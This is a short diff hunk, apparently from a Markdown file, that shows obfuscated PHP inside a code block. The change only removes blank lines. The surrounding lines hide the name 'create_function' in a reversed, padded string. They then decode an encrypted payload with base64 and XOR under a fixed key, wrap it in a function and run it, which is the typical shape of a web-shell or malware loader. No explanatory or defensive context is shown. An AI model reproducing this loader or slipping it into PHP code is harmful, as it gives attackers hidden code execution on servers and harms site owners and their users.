@@ -81,8 +81,6 @@ foreach([26,16,14,14,31,33] as $position){
 $k = $ReverseString('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c');
 $c = $k("/*XAjqgQvv4067*/", $Base64Decode( xorr($Base64Decode($VeryLongString), "tVEwfwrN302")));
 $c();
-
-
 ```
 
 
